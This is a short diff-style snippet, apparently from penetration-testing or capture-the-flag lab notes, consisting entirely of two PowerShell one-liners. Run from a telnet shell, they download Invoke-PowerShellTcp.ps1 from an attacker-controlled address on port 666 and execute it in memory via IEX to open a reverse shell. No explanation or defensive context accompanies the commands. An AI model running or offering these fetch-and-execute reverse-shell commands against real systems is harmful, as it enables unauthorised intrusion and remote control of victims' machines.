@@ -1,0 +1,5 @@
+
+start powershell command in telnet shell:
+ START /B ​""​ powershell -c IEX (​New-Object Net.Webclient).downloadstring(​'http://10.10.14.13:666/Invoke-PowerShellTcp.ps1'​)
+
+powershell IEX (​New-Object Net.Webclient).downloadstring(​'http://10.10.14.13:666/Invoke-PowerShellTcp.ps1'​)
